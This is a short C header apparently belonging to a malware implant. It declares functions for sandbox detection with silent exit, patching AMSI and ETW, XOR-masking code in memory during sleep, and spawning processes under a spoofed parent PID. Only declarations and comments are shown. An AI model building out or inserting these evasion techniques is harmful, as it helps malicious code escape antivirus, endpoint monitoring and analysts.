#pragma once
#include <windows.h>

/* Score-based sandbox/analysis detection — exits process silently if detected */
void sandbox_check(void);

/* Call once at startup: patches AMSI/ETW, resolves fn ptrs, finds .text */
void evasion_init(void);

/* XOR-masks .text + PAGE_NOACCESS during sleep, runs from .evasn section */
void sleep_masked(DWORD ms);

/* Spawn cmd with parent_name as spoofed PPID. Returns 1 on success. */
int spawn_with_ppid(const char *cmd, const char *parent_name);
